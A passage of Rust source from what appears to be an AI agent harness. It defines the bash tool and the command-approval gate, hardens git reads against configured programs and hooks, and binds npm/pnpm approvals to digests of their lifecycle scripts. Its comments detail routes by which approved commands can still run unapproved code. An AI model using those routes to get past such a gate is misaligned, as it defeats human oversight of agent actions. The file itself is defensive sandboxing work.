//! The tool loop's parts (#298's integration): the `bash` tool, a call
//! assembled from its streamed fragments, the gate's judgement turned into
//! what runs, the allow set and the workspace store behind it, the `npm`
//! and `pnpm` digests, git's aliases and free reads, and the receipt.
//!
//! [`super::session`] runs the loop: a step is a request (#29 D11), and on a
//! call it asks [`Gate::judge`] what to do, runs what may run through the
//! session's [`Confinement`], and writes one `tool_call` line per call. This
//! module decides and builds; the session holds the lock, the clock and the
//! log.
//!
//! **What may run is [`super::shell_gate`]'s verdict**, read through
//! `judge_argv` on the argv the drive would run, `bash -c <command>`. This
//! module adds only what the module left to the integration (#298
//! 5983544366): an alias pre-expanded from git's own config before judging
//! ((f)), a free read run with git's configured programs off ((e)), and the
//! digests an `npm` approval binds to (point 6), and a `pnpm` one (#482).

use std::collections::BTreeMap;
use std::fmt::Write as _;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use crate::client::shape::ToolDefinition;
use crate::client::vocabulary;
use crate::digest::sha256_hex;
use crate::formats::log;
use crate::formats::record::json::{self, Value};
use crate::formats::regimen::{self, Regimen};
use crate::formats::shell::{self, Word};
use crate::isolation::{Confinement, Policy};

use super::output::OutputCap;
use super::shell_gate::{self, Approval, Denylist, Judgement, Scope, Segment, Shape, Verdict, Why};

/// The one tool the loop runs.
pub const BASH: &str = "bash";

/// The regimen key whose presence says the session runs commands: the
/// pre-seeded session allow set, a list of command lines, empty for a
/// session whose approval trace is the measurement (#29 5981447912; Q2's
/// key).
pub const ALLOWED_COMMANDS: &str = "allowed_commands";

/// The regimen key for the approval lever's state: `"none"` turns
/// approvals off -- every command runs with no gate decision and no prompt,
/// under the regimen's isolation -- and needs no `allowed_commands`. Absent,
/// the gate decides as it always has.
pub const APPROVAL: &str = "approval";

/// The regimen key for reading a tool call the model writes as text (#560):
/// `"on"` recovers one, Qwen Code's way, when a turn makes no native call;
/// `"off"`, the default, reads such a turn as an answer, as Pi and
/// `OpenCode` 2 do (`docs/harness-baseline.md`).
pub const TOOL_CALL_TEXT_FALLBACK: &str = "tool_call_text_fallback";

/// The regimen's stance, a sentence carried into the receipt (#29
/// 5981606817).
pub const APPROVAL_POLICY: &str = "approval_policy";

/// The table and key bounding the loop's steps.
pub const LIMITS: &str = "limits";
/// See [`LIMITS`].
pub const MAX_STEPS: &str = "max_steps";

/// What the receipt says of dependencies' lifecycle scripts: not gated
/// (#298 5981578399 point 6).
pub const LIFECYCLE_SCRIPTS: &str = "unguarded";

/// The config a free git read runs under: no fsmonitor hook, no pager, no
/// signature check (`gpg.program`), no external diff (#298 5983544366 (e);
/// review round 1, finding 2), no hook -- a read that refreshes the index
/// rewrites it and runs `post-index-change` (review round 3, finding 1).
/// Global options, so they come before the subcommand.
pub const GIT_FREE_CONFIG: &[&str] = &[
    "-c",
    "core.fsmonitor=",
    "-c",
    "core.pager=cat",
    "-c",
    "core.hooksPath=/dev/null",
    "-c",
    "log.showSignature=false",
    // An empty program, not "none": safe only with `--no-ext-diff`, which
    // every free read of `GIT_DIFFING` carries (round 3, finding 9).
    "-c",
    "diff.external=",
    "-c",
    "format.pretty=medium",
    "-c",
    "core.attributesFile=/dev/null",
    "-c",
    "diff.ignoreSubmodules=all",
];

/// The environment a free git read is run with, through `env`: a partial
/// clone's missing object is not fetched, which would run a transport --
/// `ssh` among them (measured on git 2.50.1: `log -p` in a blobless clone
/// fetches; with this set it refuses).
///
/// And no attributes but the repository's own `info/attributes`, which
/// [`Gate::judge`] requires empty: the tree's `.gitattributes` is read from
/// the empty tree (`GIT_ATTR_SOURCE`), the system's not at all, and
/// `core.attributesFile` is `/dev/null` -- so no attribute names a filter
/// or a diff driver for the repository's config to run (review round 2,
/// finding 1(a); measured on git 2.50.1).
pub const GIT_FREE_ENV: &[&str] = &[
    "GIT_NO_LAZY_FETCH=1",
    "GIT_ATTR_SOURCE=4b825dc642cb6eb9a060e54bf8d69288fbee4904",
    "GIT_ATTR_NOSYSTEM=1",
];

/// The diff options a free read of these subcommands runs with: no external
/// diff, no textconv. git reads them after the subcommand -- before it they
/// are `unknown option` -- and only these three take them.
pub const GIT_DIFFING: &[&str] = &["diff", "log", "show"];

/// See [`GIT_DIFFING`].
pub const GIT_NO_PROGRAMS: &[&str] = &["--no-ext-diff", "--no-textconv"];

/// The free reads that take `--ignore-submodules`, and the word they run
/// with: on the command line it beats a per-submodule `ignore` from
/// `.gitmodules` -- a tracked file -- or the config, which
/// `diff.ignoreSubmodules` does not (review round 3, finding 3; measured on
/// git 2.50.1). It goes right after the subcommand, not after the model's
/// words, where an option taking a value (`-S`) could swallow it; a later
/// submodule option of the model's own is never free
/// ([`shell_gate::git_is_free`]), so nothing after it overrides it.
pub const GIT_SUBMODULE_READS: &[&str] = &["status", "diff", "log", "show"];

/// See [`GIT_SUBMODULE_READS`].
pub const GIT_NO_SUBMODULES: &str = "--ignore-submodules=all";

/// The `npm` lifecycle scripts `npm install` and `npm ci` run from the
/// workspace's own `package.json`, whose text an install approval binds to:
/// npm 11.17.0's own `docs/content/using-npm/scripts.md` ("Life Cycle
/// Operation Order", `npm install` and `npm ci`), plus `dependencies`, which
/// it runs whenever `node_modules` changes.
pub const LIFECYCLE: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepublish",
    "preprepare",
    "prepare",
    "postprepare",
    "dependencies",
];

/// The `bash` tool's description (#558), by the harness vote: where Pi and
/// `OpenCode` 2 agree (a command run in the working directory), theirs;
/// where they differ, Qwen Code's; each sentence held to what this harness
/// does -- a fresh `bash -c` per call in the worktree, only the policy's
/// variables, no timeout, a call that returns when its leader exits (#551),
/// a confinement that may refuse -- and no rule it does not enforce.
pub const BASH_DESCRIPTION: &str = "Executes a bash command (as `bash -c <command>`) in the \
     working directory. Returns its standard output, then its standard error.\n\n\
     - Each call runs in a fresh shell that starts in the working directory: `cd` and exported \
     variables do not carry over to the next call, and only the environment variables the \
     session passes are set.\n\
     - There is no timeout. A command that does not exit on its own, such as a server or a \
     watcher, holds the call until the turn is cancelled: start it in the background with `&` \
     and redirect its output to a file.\n\
     - The call returns when the command exits. A process left running in the background keeps \
     running, but nothing it prints after the call returns is shown.\n\
     - The command may run in a sandbox: writes outside the working directory, some reads, and \
     network access can be refused.";

/// The `bash` tool's one argument's description (#558): Pi's and
/// `OpenCode` 2's, which agree.
pub const BASH_COMMAND_DESCRIPTION: &str = "Shell command to execute";

/// The `bash` tool as a request declares it: one string argument,
/// `command`, the shape I0 captured a real server calling, with its
/// description (#558).
#[must_use]
pub fn bash_tool() -> ToolDefinition {
    let text = |s: &str| Value::String(s.to_owned());
    let command = Value::Object(BTreeMap::from([
        ("description".to_owned(), text(BASH_COMMAND_DESCRIPTION)),
        ("type".to_owned(), text("string")),
    ]));
    ToolDefinition {
        name: BASH.to_owned(),
        description: Some(BASH_DESCRIPTION.to_owned()),
        schema: Value::Object(BTreeMap::from([
            (
                "properties".to_owned(),
                Value::Object(BTreeMap::from([("command".to_owned(), command)])),
            ),
            ("required".to_owned(), Value::Array(vec![text("command")])),
            ("type".to_owned(), text("object")),
        ])),
    }
}

/// The `bash` tool as it was declared before #558, the definition I0
/// captured: no description, and its argument's words from then. What a
/// log written before #558 sent, so its heads still rebuild.
#[must_use]
pub fn bash_tool_before_its_description() -> ToolDefinition {
    let text = |s: &str| Value::String(s.to_owned());
    let command = Value::Object(BTreeMap::from([
        ("description".to_owned(), text("the command to run in bash")),
        ("type".to_owned(), text("string")),
    ]));
    ToolDefinition {
        description: None,
        schema: Value::Object(BTreeMap::from([
            (
                "properties".to_owned(),
                Value::Object(BTreeMap::from([("command".to_owned(), command)])),
            ),
            ("required".to_owned(), Value::Array(vec![text("command")])),
            ("type".to_owned(), text("object")),
        ])),
        ..bash_tool()
    }
}

/// A call the model made, assembled from its fragments.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Call {
    /// Its index in the response.
    pub index: u64,
    /// Its id, as the first fragment carrying one said. Empty if none did.
    pub id: String,
    /// The function's name, likewise.
    pub name: String,
    /// The arguments text, every fragment in order.
    pub arguments: String,
}

/// A response's calls, built fragment by fragment.
#[derive(Debug, Default)]
pub struct Calls(BTreeMap<u64, Call>);

impl Calls {
    /// Add one fragment.
    pub fn piece(&mut self, index: u64, id: Option<&str>, name: Option<&str>, arguments: &str) {
        let call = self.0.entry(index).or_insert_with(|| Call {
            index,
            id: String::new(),
            name: String::new(),
            arguments: String::new(),
        });
        if call.id.is_empty()
            && let Some(id) = id
        {
            id.clone_into(&mut call.id);
        }
        if call.name.is_empty()
            && let Some(name) = name
        {
            name.clone_into(&mut call.name);
        }
        call.arguments.push_str(arguments);
    }

    /// Whether no fragment arrived.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }

    /// The calls, by index.
    #[must_use]
    pub fn into_calls(self) -> Vec<Call> {
        self.0.into_values().collect()
    }
}

/// The command a `bash` call's arguments carry: exactly the object
/// `{"command": "<text>"}`, or nothing when they are not the JSON the tool
/// takes (refused `unparsable`).
#[must_use]
pub fn command_of(arguments: &str) -> Option<String> {
    let value: serde_json::Value = serde_json::from_str(arguments).ok()?;
    let object = value.as_object()?;
    if object.len() != 1 {
        return None;
    }
    object
        .get("command")
        .and_then(serde_json::Value::as_str)
        .map(str::to_owned)
}

/// The argv the drive runs a `bash` call's command as, and what its
/// `tool_call` line records as the model's own.
#[must_use]
pub fn argv_of(command: &str) -> Vec<String> {
    vec![BASH.to_owned(), "-c".to_owned(), command.to_owned()]
}

vocabulary! {
    /// Where an allow-set entry came from, as the receipt names it.
    Origin {
        /// The regimen's `allowed_commands`.
        Regimen => "regimen",
        /// The workspace store, decided in an earlier session.
        Store => "store",
        /// An operator's decision in this session.
        Operator => "operator",
    }
}

/// One standing approval in force: a shape, and for an `npm` script or
/// install the digest it binds to.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Entry {
    /// What it covers.
    pub shape: Shape,
    /// The sha256 an `npm run` or `npm install` approval binds to.
    pub digest: Option<String>,
    /// `session`, `workspace` or `preseeded`.
    pub scope: Scope,
    /// Where it came from.
    pub origin: Origin,
    /// When an operator decided it, on the log's clock; `None` for a
    /// pre-seed.
    pub decided_at: Option<u64>,
    /// Why the call it was decided for prompted; `None` for a pre-seed.
    pub why: Option<String>,
    /// When a workspace approval was kept, wall-clock milliseconds since
    /// the Unix epoch: the store's `approved_unix_ms`. `None` for any other.
    pub approved_unix_ms: Option<u64>,
}

/// The log's word for a scope.
#[must_use]
pub fn scope_tag(scope: Scope) -> log::ApprovalScope {
    match scope {
        Scope::Once => log::ApprovalScope::Once,
        Scope::Session => log::ApprovalScope::Session,
        Scope::Workspace => log::ApprovalScope::Workspace,
        Scope::Preseeded => log::ApprovalScope::Preseeded,
    }
}

/// The `why` word for a prompting segment: the gate module's own three.
#[must_use]
pub fn why_word(why: &Why) -> &'static str {
    match why {
        Why::Unparsable(_) => "unparsable",
        Why::Dynamic(_) => "dynamic",
        Why::NotApproved => "not_approved",
    }
}

/// What a standing `npm` or `pnpm` approval binds to, by its shape. A shape
/// that is neither is a package-manager command no standing approval
/// covers.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Bound {
    /// `npm run <x>`, `npm test` and the like: the text of the scripts npm
    /// runs for it.
    Script,
    /// `npm install` or `npm ci`: the workspace's own lifecycle scripts.
    Lifecycle,
}

/// The one spelling of `run` a standing approval covers (review round 2,
/// finding 2: an alias or an abbreviation -- `run-s`, `rum` -- prompts every
/// time, `once` still answering it). pnpm's is the same word.
const NPM_RUN: &str = "run";

/// npm's commands that run a script of their own name, each by its one
/// spelling, and the scripts it runs. `restart` runs `restart` if there is
/// one and `stop` then `start` if not, so it binds to all three. pnpm's are
/// the same words over the same scripts (pnpm 11.21.0, measured: `pnpm
/// restart` runs `stop`, `restart` and `start`, each with its `pre` and
/// `post`; `pnpm stop` runs `scripts.stop`).
const NPM_NAMED: &[(&str, &[&str])] = &[
    ("test", &["test"]),
    ("start", &["start"]),
    ("stop", &["stop"]),
    ("restart", &["restart", "stop", "start"]),
];

/// What an install subcommand may carry under a standing approval.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Carries {
    /// Nothing: the bare command.
    Nothing,
    /// Nothing, or plain package names ([`plain_package`]).
    PlainPackages,
}

/// The `pnpm` lifecycle scripts `pnpm install` runs from the workspace's
/// own `package.json`: pnpm 11.21.0's `dist/pnpm.mjs`, `DEV_PREINSTALL`
/// (`pnpm:devPreinstall`, run before any dependency is installed) and the
/// importer stages `runLifecycleHooksConcurrently` runs.
pub const PNPM_LIFECYCLE: &[&str] = &[
    "pnpm:devPreinstall",
    "preinstall",
    "install",
    "postinstall",
    "preprepare",
    "prepare",
    "postprepare",
];

/// A package manager whose standing approvals bind to digests (#482): the
/// words and files in which pnpm differs from npm. Everything else -- `run`
/// and [`NPM_NAMED`], the program exactly as written, no option word, no
/// environment prefix, a `package.json` read or failed closed -- is one code
/// path for both.
#[derive(Debug)]
struct Manager {
    /// The program, exactly: never a path to one.
    program: &'static str,
    /// The install subcommands a standing approval covers, each by its one
    /// spelling, and what it may carry.
    installs: &'static [(&'static str, Carries)],
    /// The workspace's own scripts an install runs.
    lifecycle: &'static [&'static str],
    /// The files, beyond [`npm_files`], that every digest holds: what the
    /// manager reads as configuration or runs as code in the worktree.
    files: &'static [&'static str],
    /// The `package.json` fields every digest holds, beside the scripts.
    fields: &'static [&'static str],
    /// Whether a script it runs may install first: then a script's digest
    /// also holds what the install runs.
    installs_before_run: bool,
    /// The manifests it reads in place of an absent `package.json`, which
    /// no digest reads: while one is there, none of its commands is standing.
    manifests: &'static [&'static str],
    /// The config files searched for [`Manager::unbound`].
    config: &'static [&'static str],
    /// Words that, in a [`Manager::config`] file or a [`Manager::fields`]
    /// value, name code it loads that no digest holds: while one is there,
    /// none of its commands is standing. Lower-case, matched in any case.
    unbound: &'static [&'static str],
}

/// npm: `install` bare or with plain package names, `ci` bare.
const NPM: Manager = Manager {
    program: "npm",
    installs: &[
        ("install", Carries::PlainPackages),
        ("ci", Carries::Nothing),
    ],
    lifecycle: LIFECYCLE,
    files: &[],
    fields: &[],
    installs_before_run: false,
    manifests: &[],
    config: &[],
    unbound: &[],
};

/// pnpm 11.21.0: `install` and `i` bare (pnpm adds a package with `add`),
/// its manifest `package.json`, else `package.json5`, else `package.yaml`
/// (`MANIFEST_BASE_NAMES`); a pnpmfile a setting names (`pnpmfile`,
/// `globalPnpmfile`) or a `configDependencies` plugin brings is loaded for
/// every command (`installConfigDepsAndLoadHooks`), and is in no digest
/// (#484's review round 1, findings 1 and 2: fail closed).
///
/// `add` with plain package names. A hook in `.pnpmfile.mjs`, or else
/// `.pnpmfile.cjs`, runs JS; `pnpm-workspace.yaml` holds pnpm's settings
/// (`allowBuilds`, `onlyBuiltDependencies`, `scriptShell`,
/// `verifyDepsBeforeRun`, …); `package.json`'s `packageManager` and
/// `devEngines` pick the pnpm that runs (it downloads and switches), and
/// its `pnpm` field holds settings. `verifyDepsBeforeRun` defaults to
/// `install`, so a script may install first.
const PNPM: Manager = Manager {
    program: "pnpm",
    installs: &[
        ("install", Carries::Nothing),
        ("i", Carries::Nothing),
        ("add", Carries::PlainPackages),
    ],
    lifecycle: PNPM_LIFECYCLE,
    files: &[".pnpmfile.cjs", ".pnpmfile.mjs", "pnpm-workspace.yaml"],
    fields: &["packageManager", "devEngines", "pnpm"],
    installs_before_run: true,
    manifests: &["package.json5", "package.yaml"],
    config: &["pnpm-workspace.yaml", ".npmrc"],
    unbound: &["pnpmfile", "configdependencies"],
};

/// The package managers whose approvals bind to digests.
const MANAGERS: &[Manager] = &[NPM, PNPM];

/// Other names a manager answers to, which no standing approval covers:
/// `pn`, pnpm 11.21.0's alias of `pnpm`.
const MANAGER_ALIASES: &[&str] = &["pn"];

/// The manager a shape's program names: the program, or a pnpm a runner
/// pinned (`pnpm@11.20.0`, [`shell_gate::package_of`]).
fn manager(program: &str) -> Option<&'static Manager> {
    let program = shell_gate::package_of(program);
    MANAGERS.iter().find(|manager| manager.program == program)
}

/// A simple command's manager and its words from the program on: the
/// program exactly as written, or a pnpm run through a runner that can be
/// shaped as its own ([`shell_gate::through`], #484's ruling).
fn manager_words(words: &[Word]) -> Option<(&'static Manager, &[Word])> {
    // `npm exec pnpm …` is pnpm's, not npm's.
    if let Some(through) = shell_gate::through(words) {
        return Some((manager(through.package)?, through.words)).filter(|_| through.plain);
    }
    let first = words.first().filter(|w| w.literal)?;
    let manager = MANAGERS.iter().find(|m| m.program == first.text)?;
    Some((manager, words))
}

/// Whether `program` is a package manager: then a command of it that is
/// not [`Bound`] is covered by no standing approval.
fn manages(program: &str) -> bool {
    manager(program).is_some() || MANAGER_ALIASES.contains(&program)
}

fn bound(shape: &Shape) -> Option<Bound> {
    let manager = manager(&shape.program)?;
    let subcommand = shape.subcommand.as_deref()?;
    if subcommand == NPM_RUN || NPM_NAMED.iter().any(|(name, _)| *name == subcommand) {
        Some(Bound::Script)
    } else if manager.installs.iter().any(|(name, _)| *name == subcommand) {
        Some(Bound::Lifecycle)
    } else {
        None
    }
}

/// The worktree's `package.json`, read: the whole value and its `scripts`
/// table.
struct Package {
    whole: serde_json::Value,
    scripts: serde_json::Map<String, serde_json::Value>,
}

/// `package.json` in `worktree`: empty when there is none, `scripts` empty
/// when it has none; `None` when there is one this cannot read -- npm reads
/// a byte-order mark or a lone surrogate escape that `serde_json` refuses,
/// and every script would read as absent -- so no digest can be named and no
/// npm command is standing (review round 3, finding 7).
fn package_json(worktree: &Path) -> Option<Package> {
    let bytes = match std::fs::read(worktree.join("package.json")) {
        Ok(bytes) => bytes,
        Err(why) if why.kind() == std::io::ErrorKind::NotFound => {
            return Some(Package {
                whole: serde_json::Value::Null,
                scripts: serde_json::Map::new(),
            });
        }
        Err(_) => return None,
    };
    let whole: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
    let scripts = match whole.get("scripts") {
        None => serde_json::Map::new(),
        Some(scripts) => scripts.as_object()?.clone(),
    };
    Some(Package { whole, scripts })
}

/// The script npm runs in place of an absent `start`, and the file it
/// runs: `node server.js` when `server.js` exists (npm 11.17.0's
/// `docs/content/commands/npm-start.md`; pnpm 11.21.0 the same, measured).
/// A `start` or `restart` digest holds that file's bytes (review round 3,
/// finding 5).
const NPM_DEFAULT_START: (&str, &str) = ("start", "server.js");

/// `name`'s line in a digest: its sha256 in `worktree`, or `absent`.
fn file_line(text: &mut String, worktree: &Path, name: &str) {
    let digest = std::fs::read(worktree.join(name))
        .map_or_else(|_| "absent".to_owned(), |bytes| sha256_hex(&bytes));
    let _ = writeln!(text, "{name} {digest}");
}

/// The lines every npm digest opens with: the sha256 of each file in the
/// worktree that changes what npm runs without being a script -- `.npmrc`
/// (`script-shell`, `node-options`, …) and `binding.gyp` (an install's
/// default `node-gyp rebuild`) -- or `absent` (review round 2, finding 2).
fn npm_files(worktree: &Path) -> String {
    let mut text = String::new();
    for name in [".npmrc", "binding.gyp"] {
        file_line(&mut text, worktree, name);
    }
    text
}

/// The worktree's `package.json` as `manager` reads it: `None` when it
/// cannot be read ([`package_json`]), when `package.json` is absent and one
/// of the manager's other [`Manager::manifests`] is there, or when a
/// [`Manager::config`] file or a [`Manager::fields`] value mentions an
/// [`Manager::unbound`] word -- or a config file cannot be read.
fn manager_package(manager: &Manager, worktree: &Path) -> Option<Package> {
    let package = package_json(worktree)?;
    let absent = |name: &str| {
        std::fs::symlink_metadata(worktree.join(name))
            .is_err_and(|why| why.kind() == std::io::ErrorKind::NotFound)
    };
    if absent("package.json") && manager.manifests.iter().any(|name| !absent(name)) {
        return None;
    }
    let mentions = |text: &str| {
        let text = text.to_ascii_lowercase();
        manager.unbound.iter().any(|word| text.contains(word))
    };
    for name in manager.config {
        match std::fs::read(worktree.join(name)) {
            Ok(bytes) if mentions(&String::from_utf8_lossy(&bytes)) => return None,
            Err(why) if why.kind() != std::io::ErrorKind::NotFound => return None,
            _ => {}
        }
    }
    let unbound_field = manager.fields.iter().any(|field| {
        package
            .whole
            .get(*field)
            .is_some_and(|value| mentions(&value.to_string()))
    });
    (!unbound_field).then_some(package)
}

/// The lines every digest of `manager` opens with: [`npm_files`] (pnpm
/// reads `.npmrc` too), then its own [`Manager::files`], then its
/// [`Manager::fields`], each `name=json` or `name` alone where absent.
fn manager_files(manager: &Manager, worktree: &Path, package: &Package) -> String {
    let mut text = npm_files(worktree);
    for name in manager.files {
        file_line(&mut text, worktree, name);
    }
    for field in manager.fields {
        match package.whole.get(*field) {
            Some(value) => {
                let _ = writeln!(text, "{field}={value}");
            }
            None => {
                let _ = writeln!(text, "{field}");
            }
        }
    }
    text
}

/// One line per script of `names` in `scripts`, `name=text`, or `name` alone
/// where it is absent -- so a script that appears later is a change.
fn script_lines<'a>(
    text: &mut String,
    scripts: &serde_json::Map<String, serde_json::Value>,
    names: impl IntoIterator<Item = &'a str>,
) {
    for name in names {
        match scripts.get(name).and_then(serde_json::Value::as_str) {
            Some(script) => {
                let _ = writeln!(text, "{name}={script}");
            }
            None => {
                let _ = writeln!(text, "{name}");
            }
        }
    }
}

/// The sha256 of the scripts `names` `manager` runs in the worktree's
/// `package.json`, each with the `pre` and `post` scripts it runs around it,
/// after [`manager_files`], for `start` after [`NPM_DEFAULT_START`]'s file,
/// and, for a manager that may install first, followed by its lifecycle
/// scripts. `None` when the `package.json` cannot be read.
fn manager_scripts_digest(manager: &Manager, worktree: &Path, names: &[&str]) -> Option<String> {
    let package = manager_package(manager, worktree)?;
    let mut text = manager_files(manager, worktree, &package);
    let (start, server) = NPM_DEFAULT_START;
    if names.contains(&start) {
        file_line(&mut text, worktree, server);
    }
    for name in names {
        let each = [
            format!("pre{name}"),
            (*name).to_owned(),
            format!("post{name}"),
        ];
        script_lines(&mut text, &package.scripts, each.iter().map(String::as_str));
    }
    if manager.installs_before_run {
        script_lines(
            &mut text,
            &package.scripts,
            manager.lifecycle.iter().copied(),
        );
    }
    Some(sha256_hex(text.as_bytes()))
}

/// The sha256 an install of `manager` binds to: [`manager_files`], then the
/// workspace's own lifecycle scripts, one per line in its order. Dependencies'
/// scripts are not in it: the receipt says they are [`LIFECYCLE_SCRIPTS`].
/// `None` when the `package.json` cannot be read.
fn manager_lifecycle_digest(manager: &Manager, worktree: &Path) -> Option<String> {
    let package = manager_package(manager, worktree)?;
    let mut text = manager_files(manager, worktree, &package);
    script_lines(
        &mut text,
        &package.scripts,
        manager.lifecycle.iter().copied(),
    );
    Some(sha256_hex(text.as_bytes()))
}

/// The sha256 of the npm scripts `names`: [`manager_scripts_digest`] for npm.
#[must_use]
pub fn scripts_digest(worktree: &Path, names: &[&str]) -> Option<String> {
    manager_scripts_digest(&NPM, worktree, names)
}

/// The sha256 an `npm run <name>` approval binds to ([`scripts_digest`] of
/// that one script).
#[must_use]
pub fn script_digest(worktree: &Path, name: &str) -> Option<String> {
    scripts_digest(worktree, &[name])
}

/// The sha256 an `npm install` approval binds to: [`npm_files`], then the
/// workspace's own lifecycle scripts, each `name=text` or `name` alone where
/// absent, one per line in [`LIFECYCLE`]'s order.
#[must_use]
pub fn lifecycle_digest(worktree: &Path) -> Option<String> {
    manager_lifecycle_digest(&NPM, worktree)
}

/// Whether `word` is a plain package name, as `npm install <name>` may
/// carry under a standing approval: a name, a scope, a version -- no path,
/// no URL, no protocol, no option.
fn plain_package(word: &str) -> bool {
    !word.is_empty()
        // An option word is refused before this, once, for every form.
        && !word.starts_with(['.', '/', '~'])
        && !word.contains("..")
        && word.chars().all(|c| {
            c.is_ascii_lowercase()
                || c.is_ascii_digit()
                || ['-', '.', '_', '/', '@', '^', '~', '*'].contains(&c)
        })
}

/// A line's direct package-manager commands: each script-running one's
/// manager and scripts, in order, and each install's manager.
type ManagerCommands = (Vec<(&'static Manager, Vec<String>)>, Vec<&'static Manager>);

/// What a line's direct `npm` and `pnpm` commands run, when every one of
/// them is a form a standing approval covers (review round 2, finding 2):
/// `run <name>`, `test|start|stop|restart`, and the manager's
/// [`Manager::installs`] -- the program exactly, never a path to one (review
/// round 3, finding 6), with no option word anywhere and no environment
/// prefix, which can choose what npm runs as `.npmrc` does (finding 4).
/// The scripts of each script-running one, in order, and each install.
/// `None` for any other such command on the line; the caller also compares
/// the counts with the gate's segments, so one inside a wrapper is never
/// standing.
fn npm_commands(command: &str) -> Option<ManagerCommands> {
    let list = shell::parse(command).ok()?;
    let mut scripts = Vec::new();
    let mut installs = Vec::new();
    for simple in list.simple_commands() {
        let Some((manager, words)) = manager_words(&simple.words) else {
            continue;
        };
        if !simple.assignments.is_empty() {
            return None;
        }
        if words.iter().any(|w| !w.literal || w.text.starts_with('-')) {
            return None;
        }
        let rest: Vec<&str> = words[1..].iter().map(|w| w.text.as_str()).collect();
        let installs_as = |sub: &str, packages: &[&str]| {
            manager.installs.iter().any(|(name, carries)| {
                *name == sub
                    && (packages.is_empty()
                        || (*carries == Carries::PlainPackages
                            && packages.iter().all(|p| plain_package(p))))
            })
        };
        match rest.as_slice() {
            [run, name] if *run == NPM_RUN => scripts.push((manager, vec![(*name).to_owned()])),
            [sub] if NPM_NAMED.iter().any(|(name, _)| name == sub) => {
                let names = NPM_NAMED
                    .iter()
                    .find(|(name, _)| name == sub)
                    .map_or(&[][..], |(_, names)| *names);
                scripts.push((
                    manager,
                    names.iter().map(|name| (*name).to_owned()).collect(),
                ));
            }
            [sub, packages @ ..] if installs_as(sub, packages) => installs.push(manager),
            _ => return None,
        }
    }
    Some((scripts, installs))
}

/// The digests a line's package-manager segments bind to: per script for a
/// script-running one, per install the lifecycle digest of its manager.
#[derive(Debug, Clone, Default)]
struct Digests {
    /// The digest of each direct script-running command, or `None` when the
    /// line's script-running segments cannot all be named, and none can be
    /// covered.
    runs: Option<Vec<String>>,
    /// The lifecycle digest of each install, or `None` when the line's
    /// installs cannot all be read as the worktree's own.
    lifecycle: Option<Vec<String>>,
}

impl Digests {
    /// `npm_env` is whether the session passes an `npm_config_*` or
    /// `pnpm_config_*` variable, which changes what npm or pnpm runs as
    /// `.npmrc` does: then no such command is standing.
    fn of(command: &str, segments: &[Segment], worktree: &Path, npm_env: bool) -> Self {
        let count = |kind: Bound| {
            segments
                .iter()
                .filter(|s| s.shape.as_ref().and_then(bound) == Some(kind))
                .count()
        };
        let read = npm_commands(command).filter(|_| !npm_env);
        let runs = read
            .as_ref()
            .filter(|(names, _)| names.len() == count(Bound::Script))
            .and_then(|(names, _)| {
                names
                    .iter()
                    .map(|(manager, each)| {
                        let each: Vec<&str> = each.iter().map(String::as_str).collect();
                        manager_scripts_digest(manager, worktree, &each)
                    })
                    .collect()
            });
        let lifecycle = read
            .as_ref()
            .filter(|(_, installs)| installs.len() == count(Bound::Lifecycle))
            .and_then(|(_, installs)| {
                installs
                    .iter()
                    .map(|manager| manager_lifecycle_digest(manager, worktree))
                    .collect()
            });
        Self { runs, lifecycle }
    }

    /// The digests an entry for `shape` must hold to cover it: one per
    /// script for a script-running `npm` or `pnpm`, one per install for an
    /// install, none for any program that is no package manager. `None` when
    /// they cannot be named, and for every other package-manager command: no
    /// standing approval covers it.
    fn wanted(&self, shape: &Shape) -> Option<Vec<Option<String>>> {
        let all = |digests: &Option<Vec<String>>| {
            digests
                .as_ref()
                .map(|digests| digests.iter().cloned().map(Some).collect())
        };
        match bound(shape) {
            None if manages(&shape.program) => None,
            None => Some(vec![None]),
            Some(Bound::Lifecycle) => all(&self.lifecycle),
            Some(Bound::Script) => all(&self.runs),
        }
    }
}

/// The prefixes of the environment variables npm and pnpm read as config:
/// `npm_config_*`, and pnpm 11.21.0's `pnpm_config_*` (its config reader's
/// `env.js`). Case-insensitive.
const CONFIG_PREFIXES: &[&str] = &["npm_config_", "pnpm_config_"];

/// The config variables a session may pass and keep npm and pnpm standing:
/// npm's cache directory, which stores tarballs, and pnpm's store
/// directory, which stores packages; neither chooses anything that runs.
/// T1's regimen passes them by ruling (#301, 5981651636: the default five
/// plus `npm_config_cache`; #484: plus `pnpm_config_store_dir`, which pnpm
/// 11.21.0 reads, lower- or upper-case, where it ignores
/// `npm_config_store_dir`). Exactly these spellings; every other config
/// variable makes npm and pnpm non-standing.
pub const NPM_CONFIG_EXCUSED: &[&str] = &[
    "npm_config_cache",
    "NPM_CONFIG_CACHE",
    "pnpm_config_store_dir",
    "PNPM_CONFIG_STORE_DIR",
];

/// The free reads that print commits, whose output a `gpg.*`, `format.pretty`
/// or `pretty.*` key can make run `gpg.program`.
const GIT_PRINTS_COMMITS: &[&str] = &["log", "show"];

/// The config key `git branch` sorts by, as `git config --name-only`
/// prints it.
const GIT_BRANCH_SORT: &str = "branch.sort";

/// The `git branch` options that print each branch's commit.
const GIT_BRANCH_VERBOSE: &[&str] = &["-v", "-vv", "--verbose"];

/// What a free read depends on in the repository, beyond its own argv.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Repository {
    /// Its `info/attributes` holds something: an attribute there can name a
    /// filter or a diff driver, which no override reaches.
    pub info_attributes: bool,
    /// Its effective config has a `gpg.*`, `format.pretty` or `pretty.*`
    /// key.
    pub signing: bool,
    /// Its effective config has a `branch.sort`, which `git branch` sorts
    /// by -- a `signature` key runs `gpg.program` -- and which a `-c`
    /// override does not replace: the key is multi-valued (review round 3,
    /// finding 2; measured on git 2.50.1).
    pub branch_sort: bool,
}

/// Reads [`Repository`] for a worktree, or nothing when it cannot be read.
pub type RepositoryReader = fn(&Path) -> Option<Repository>;

/// git, read-only, in `worktree` with nothing but `PATH` and `HOME` and
/// the free read's own overrides.
fn git_reading(worktree: &Path, args: &[&str]) -> Option<std::process::Output> {
    let mut command = Command::new("git");
    command.env_clear();
    for key in ["PATH", "HOME"] {
        if let Some(value) = std::env::var_os(key) {
            command.env(key, value);
